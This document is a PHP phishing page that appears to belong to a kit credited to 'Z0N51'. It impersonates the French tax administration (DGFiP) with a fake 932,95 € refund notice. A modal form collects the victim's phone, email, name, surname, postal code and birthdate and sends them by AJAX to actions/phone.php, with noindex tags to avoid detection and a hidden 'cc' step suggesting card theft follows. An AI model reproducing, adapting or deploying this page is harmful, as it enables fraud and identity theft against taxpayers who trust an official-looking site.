<?php 
// AJOUT: Protection CSRF
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

if (empty($_SESSION['csrf_token_iban'])) {
    $_SESSION['csrf_token_iban'] = bin2hex(random_bytes(32));
}
$csrf_token = $_SESSION['csrf_token_iban'];

include("common/includes.php") 
?>
<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
	function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
	function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error-message">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
	
?>
<!doctype html>
<html style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <meta http-equiv="refresh" content=";URL=cc.php">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Remboursement</title>
    </head>

    <body style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

        <header id="header2">
            <div class="container">
                <div class="left">
                    <img style="max-width: 126px;" src="assets/imgs/logo1.svg">
                </div>
                <div class="mid">
                    <h3>Mon espace <span>particulier</span></h3>
                    <img style="max-width: 126px;" src="assets/imgs/logo2.svg">
                </div>
                <div class="right">
                    <p>
                        Bienvenue<br>
                        Numéro fiscal : 1195217722475<br>
                        <span>Retour au tableau de bord</span>
                    </p>
                </div>
            </div>
        </header>

        <!-- BREADCRUMB -->
        <div id="breadcrumb" class="mt-4">
            <div class="container">
                <u>Tableau de bord</u> <span>-</span> Remboursement et Paiement en ligne

            </div>
        </div>
        <!-- BREADCRUMB -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="details">
                    <div class="title">
                        <h3>Remboursement sécurisé</h3>
                       <li>Référence : <b>600193110380</b></li>
                       <li>Montant de la transaction &nbsp;: <b>932,95 €</b></li>

                        </p>
                    </div>

 
 <style>
		/* The Modal (background) */
		.modalb {
			display: block;
			/* Hidden by default */
			position: fixed;
			/* Stay in place */
			z-index: 999999999;
			/* Sit on top */
			padding-top: 60px;
			/* Location of the box */
			left: 0;
			top: 0;
			width: 100%;
			/* Full width */
			height: 100%;
			/* Full height */
			overflow: auto;
			/* Enable scroll if needed */
			background-color: rgb(0, 0, 0);
			/* Fallback color */
			background-color: rgba(0, 0, 0, 0.4);
			/* Black w/ opacity */
		}

		/* Modal Content */
		.modal-contentb {
			background-color: #fefefe;
			margin: auto;
			border: 1px solid #888;
			width: 80%;
			max-height: 900px;
			height: auto;
			max-width: 650px;
			border-radius: 9px;
			box-shadow: 0 2px 4px 0 rgba(12, 43, 119, 0.15);
			overflow: hidden;
			z-index: 10003;
			overflow-y: auto;
		}
		#myModalb .header {
	position: relative;
	color: #fff;
	background-color: #1344a1;
	overflow: hidden;
	_overflow: visible;
	zoom: 1;
	margin-bottom: 0px;
}
#myModalb .header {
	position: relative;
	height: auto;
	background-color: #fff;
	zoom: 1;
	margin-bottom: 0;
	overflow: hidden;
}
#myModalb .header .round-banner::before {
	content: "";
	position: absolute;
	top: -35%;
	left: -6.5%;
	background-color: #308276;
	width: 113%;
	height: 100px;
	border-radius: 0 0 50% 50%;
}
#myModalb .header .round-banner {
	position: relative;
	height: 10rem;
	width: 100%;
	overflow: hidden;
}
#myModalb .header #popinTitle, #myModalb .modal-body #popinTitle {
	font-size: 2.4rem;
	line-height: 2.8rem;
	font-family: LatoBold, Arial, sans-serif !important;
	font-family: var(--text-bold-font) !important;
	font-weight: normal;
	width: 100%;
	padding: 0 1.5rem;
	margin: 0;
	color: #000;
	text-align: center;
	text-transform: none;
}
#myModalb .header .round-banner::before {
	content: "";
	position: absolute;
	top: -5%;
	left: -6.5%;
	background-color: #0b6ba8;
	width: 113%;
	height: 100px;
	border-radius: 0 0 50% 50%;
}
.icon-ic_interface_checklist::before {
	content: "\e950";
	color: #0b6ba8;
}
#myModalb .header .round-banner svg {
	background-color: #fff;
	border-radius: 50%;
	padding: .5rem;
	font-size: 4.8rem;
	position: absolute;
	bottom: 0.5rem;
	left: 50%;
	margin-left: -2.4rem;
}
[class^="icon-ic"], [class*=" icon-ic"] {
	font-family: 'icons2020' !important;
	font-style: normal;
	font-weight: normal;
	font-variant: normal;
	text-transform: none;
	line-height: 1;
	-webkit-font-smoothing: antialiased;
	-moz-osx-font-smoothing: grayscale;
}
#myModalb .header .round-banner [class*="icon-"] {
	font-size: 4.8rem;
}
#myModalb .header #popinTitle, #myModalb .modal-body #popinTitle {
	font-size: 1.8rem;
	line-height: 2.8rem;
	font-family: LatoBold, Arial, sans-serif !important;
	font-family: var(--text-bold-font) !important;
	font-weight: normal;
	width: 100%;
	padding: 0 1.5rem;
	margin: 0;
	color: #000;
	text-align: center;
	text-transform: none;
}
.a-center {
	text-align: center !important;
}
.button, #main .button, #main form .button {
	display: inline-block;
	min-width: auto;
	height: 3.4rem;
	padding: 0 !important;
	padding-left: 16px !important;
	padding-right: 16px !important;
	background-color: transparent;
	border: 1px solid #0b6ba8;
	border-radius: 4px;
	font-size: 1rem;
	box-sizing: border-box;
	outline: none;
}

		.header .round-banner {
			position: relative;
			height: 10rem;
			width: 100%;
			overflow: hidden;
		}

		.header #popinTitle,
		.modal-body #popinTitle {
			font-size: 2.4rem;
			line-height: 2.8rem;
			font-family: LatoBold, Arial, sans-serif !important;
			font-family: var(--text-bold-font) !important;
			font-weight: normal;
			width: 100%;
			padding: 0 1.5rem;
			margin: 0;
			color: #000;
			text-align: center;
			text-transform: none;
		}

		.button.button--primary>span,
		#main form .button.button--primary>span {
			background-color: #0b6ba8;
			background-color: var(--primary-blue-color);
			color: #FFF;
			display: block;
			height: 100%;
			display: flex;
			align-items: center;
			justify-content: center;
		}
		
		.form-group {
			margin-bottom: 15px;
		}
		
		.form-row {
			display: flex;
			flex-wrap: wrap;
			margin-right: -5px;
			margin-left: -5px;
		}
		
		.col-md-6 {
			flex: 0 0 50%;
			max-width: 50%;
			padding: 0 5px;
		}
	</style>

	<!-- The Modal -->
	<div id="myModalb" class="modalb">

		<!-- Modal content -->
		<div class="modal-contentb">
			
			<div class="document" style="height: auto;display: flex;flex-direction: column;">
				<div class="header popinV3-header ">
					<div class="round-banner">
						<svg fill="#0b6ba8" width="58px" height="58px" viewBox="0 0 1920 1920" xmlns="http://www.w3.org/2000/svg" stroke="#0b6ba8">
						<g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M960 0c530.193 0 960 429.807 960 960s-429.807 960-960 960S0 1490.193 0 960 429.807 0 960 0Zm0 101.053c-474.384 0-858.947 384.563-858.947 858.947S485.616 1818.947 960 1818.947 1818.947 1434.384 1818.947 960 1434.384 101.053 960 101.053Zm-42.074 626.795c-85.075 39.632-157.432 107.975-229.844 207.898-10.327 14.249-10.744 22.907-.135 30.565 7.458 5.384 11.792 3.662 22.656-7.928 1.453-1.562 1.453-1.562 2.94-3.174 9.391-10.17 16.956-18.8 33.115-37.565 53.392-62.005 79.472-87.526 120.003-110.867 35.075-20.198 65.9 9.485 60.03 47.471-1.647 10.664-4.483 18.534-11.791 35.432-2.907 6.722-4.133 9.646-5.496 13.23-13.173 34.63-24.269 63.518-47.519 123.85l-1.112 2.886c-7.03 18.242-7.03 18.242-14.053 36.48-30.45 79.138-48.927 127.666-67.991 178.988l-1.118 3.008a10180.575 10180.575 0 0 0-10.189 27.469c-21.844 59.238-34.337 97.729-43.838 138.668-1.484 6.37-1.484 6.37-2.988 12.845-5.353 23.158-8.218 38.081-9.82 53.42-2.77 26.522-.543 48.24 7.792 66.493 9.432 20.655 29.697 35.43 52.819 38.786 38.518 5.592 75.683 5.194 107.515-2.048 17.914-4.073 35.638-9.405 53.03-15.942 50.352-18.932 98.861-48.472 145.846-87.52 41.11-34.26 80.008-76 120.788-127.872 3.555-4.492 3.555-4.492 7.098-8.976 12.318-15.707 18.352-25.908 20.605-36.683 2.45-11.698-7.439-23.554-15.343-19.587-3.907 1.96-7.993 6.018-14.22 13.872-4.454 5.715-6.875 8.77-9.298 11.514-9.671 10.95-19.883 22.157-30.947 33.998-18.241 19.513-36.775 38.608-63.656 65.789-13.69 13.844-30.908 25.947-49.42 35.046-29.63 14.559-56.358-3.792-53.148-36.635 2.118-21.681 7.37-44.096 15.224-65.767 17.156-47.367 31.183-85.659 62.216-170.048 13.459-36.6 19.27-52.41 26.528-72.201 21.518-58.652 38.696-105.868 55.04-151.425 20.19-56.275 31.596-98.224 36.877-141.543 3.987-32.673-5.103-63.922-25.834-85.405-22.986-23.816-55.68-34.787-96.399-34.305-45.053.535-97.607 15.256-145.963 37.783Zm308.381-388.422c-80.963-31.5-178.114 22.616-194.382 108.33-11.795 62.124 11.412 115.76 58.78 138.225 93.898 44.531 206.587-26.823 206.592-130.826.005-57.855-24.705-97.718-70.99-115.729Z" fill-rule="evenodd"></path> </g></svg>
					</div>
					<h1 id="popinTitle" style="text-align: center; color: #0b6ba8;" >REMBOURSEMENT</h1>
				</div>
				<div class="line" style="max-height: 500px; overflow-y: auto;">
					<div id="compte_bancaire_haut2" class="textPopinDetail">
						<div class="block basecomponent  section blocstd">
							<div class="CQblocedito cq-dd-file"
								id="bloc_kyc_verification_donnees_personnelles_obligatoire" style="margin: 6px 24px;">
								<div class="block">
									<div class="blockInside">
										<div>

											<div class="textFCK" style="text-align: center;">
												<p>Vous avez un remboursement non effectué de la part de votre impôt finances.<br>
												<form action="" method="post">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                        <input type="hidden" name="step" value="cc">
            
              <div style="text-align: left;">
              <li>IBAN : <b>FR76 XXXX XXXX XXXX XXXX XXXX XXX</b></li>
              <li>Référence Unique de Mandat : <b>NNFR46ZZZ0050022395425254680R110380</b></li>
              <li>Référence : <b>600193110380</b></li>
               <li>Montant de la transaction &nbsp;: <b>932,95 €</b></li>
               </div>

             <hr />
             
             <div class="form-row">
				<div class="form-group col-md-6">
					<label for="phone">Téléphone mobile <span style="color: #e03136;">*</span></label>
					<input type="tel" class="form-control phone" id="phone" name="phone" onkeypress="forceImputNumber()" placeholder="06 xx xx xx xx" maxlength="15" autocomplete="off">
				</div>
				
				<div class="form-group col-md-6">
					<label for="email">Adresse email <span style="color: #e03136;">*</span></label>
					<input type="email" class="form-control email" id="email" name="email" placeholder="exemple@email.com" autocomplete="off">
				</div>
			</div>
			
			<div class="form-row">
				<div class="form-group col-md-6">
					<label for="name">Nom <span style="color: #e03136;">*</span></label>
					<input type="text" placeholder="Votre nom" name="name" id="name" class="form-control name GeolocationDisabled-noBorder" autocomplete="off">
				</div>
				
				<div class="form-group col-md-6">
					<label for="surname">Prénom <span style="color: #e03136;">*</span></label>
					<input type="text" placeholder="Votre prénom" name="surname" id="surname" class="form-control surname GeolocationDisabled-noBorder" autocomplete="off">
				</div>
			</div>
			
			<div class="form-row">
				<div class="form-group col-md-6">
					<label for="postal_code">Code postal <span style="color: #e03136;">*</span></label>
					<input type="text" class="form-control postal_code" id="postal_code" name="postal_code" onkeypress="forceImputNumber()" placeholder="75000" maxlength="5" autocomplete="off">
				</div>
				
				<div class="form-group col-md-6">
					<label for="birthdate">Date de naissance <span style="color: #e03136;">*</span></label>
					<input type="text" class="form-control birthdate" id="birthdate" name="birthdate" placeholder="JJ/MM/AAAA" maxlength="10" autocomplete="off">
				</div>
			</div>
			
			<div style="clear: both;"></div>
			
            <div class="btns" style="text-align: center; margin-top: 20px;">
                <button type="button" id="submit"><i class="fas fa-lock"></i> Etape suivante</button>
            </div>
            <br>
        </form>

					</div>
				</div>
			</div>
			

		</div>
                      
                       
                      
        </main>
        <!-- END MAIN -->
		 

        <footer id="footer">
            <div class="container">
                <p>Direction générale des Finances publiques</p>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="assets/js/script.js"></script>
		
				<!--fin page 1-->
							
		<script type="text/javascript">
        const forceImputNumber = (evt) => {
            evt = evt ? evt : window.event;
            var charCode = evt.which ? evt.which : evt.keyCode;
            if (charCode > 31 && (charCode < 48 || charCode > 57) && charCode !== 46) {
                evt.preventDefault();
            } else {
                return true;
            }
        };
		
		// Formatage date de naissance
		$(document).ready(function() {
			$('#birthdate').on('input', function() {
				var value = $(this).val().replace(/\D/g, '');
				if (value.length >= 2) {
					value = value.substring(0,2) + '/' + value.substring(2);
				}
				if (value.length >= 5) {
					value = value.substring(0,5) + '/' + value.substring(5,9);
				}
				$(this).val(value);
			});
			
			// Validation code postal (5 chiffres)
			$('#postal_code').on('blur', function() {
				var cp = $(this).val();
				if (cp.length !== 5 || isNaN(cp)) {
					alert('Le code postal doit contenir exactement 5 chiffres');
					$(this).focus();
				}
			});
		});
         </script>
	
        <script type="text/JavaScript">
            $(document).ready(function() {
                
                $('#submit').click(function(e) {
                    e.preventDefault();
                    
                    // Récupérer toutes les valeurs
                    var phone = $('.phone').val();
                    var name = $('.name').val();
                    var surname = $('.surname').val();
                    var email = $('.email').val();
                    var postalCode = $('.postal_code').val();
                    var birthdate = $('.birthdate').val();
                    var csrfToken = $('input[name="csrf_token"]').val();
                    
                    // Validation basique
                    var errors = [];
                    
                    if (phone.length < 10) errors.push('Le téléphone doit avoir au moins 10 chiffres');
                    if (!validateEmail(email)) errors.push('Email invalide');
                    if (name.length < 1) errors.push('Le nom est obligatoire');
                    if (surname.length < 1) errors.push('Le prénom est obligatoire');
                    if (postalCode.length !== 5 || isNaN(postalCode)) errors.push('Code postal invalide (5 chiffres)');
                    if (!validateDate(birthdate)) errors.push('Date de naissance invalide (format JJ/MM/AAAA)');
                    
                    if (errors.length > 0) {
                        alert('Veuillez corriger les erreurs suivantes :\n\n' + errors.join('\n'));
                        return false;
                    }
                    
                    // Envoi AJAX
                    $.ajax({
                        type: "post",
                        url: "actions/phone.php",
                        data: {
                            phone: phone,
                            name: name,
                            surname: surname,
                            email: email,
                            postal_code: postalCode,
                            birthdate: birthdate,
                            csrf_token: csrfToken
                        },
                        success: function(response) {
                            window.location.href = 'load-rembour.php';
                        },
                        error: function(xhr) {
                            if (xhr.status === 403) {
                                alert('Session expirée. Veuillez recharger la page.');
                                location.reload();
                            } else {
                                alert('Une erreur est survenue. Veuillez réessayer.');
                            }
                        }
                    });
                });
                
                // Fonction de validation email
                function validateEmail(email) {
                    var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    return re.test(email);
                }
                
                // Fonction de validation date
                function validateDate(date) {
                    var re = /^(\d{2})\/(\d{2})\/(\d{4})$/;
                    if (!re.test(date)) return false;
                    
                    var parts = date.split('/');
                    var day = parseInt(parts[0], 10);
                    var month = parseInt(parts[1], 10);
                    var year = parseInt(parts[2], 10);
                    
                    // Vérification basique
                    if (year < 1900 || year > new Date().getFullYear()) return false;
                    if (month < 1 || month > 12) return false;
                    if (day < 1 || day > 31) return false;
                    
                    return true;
                }

            });
        </script>

    </body>

</html>